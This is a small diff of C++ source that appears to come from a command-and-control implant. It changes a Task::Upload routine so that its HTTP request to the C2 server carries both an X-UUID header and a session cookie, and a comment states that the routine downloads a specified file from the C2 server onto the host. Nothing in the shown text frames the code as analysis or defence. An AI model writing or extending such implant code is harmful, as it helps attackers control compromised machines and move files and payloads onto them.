@@ -4,7 +4,9 @@ namespace Task
 {
     std::wstring Upload(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest)
     {
-        std::wstring wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";
+        std::wstring wHeaders = L"";
+        wHeaders += L"X-UUID: " + pState->wUUID + L"\r\n";
+        wHeaders += L"Cookie: session_id=" + pState->wSessionID + L"\r\n";
 
         // Download a specified file from the C2 server.
         BOOL bResult = System::Http::FileDownload(
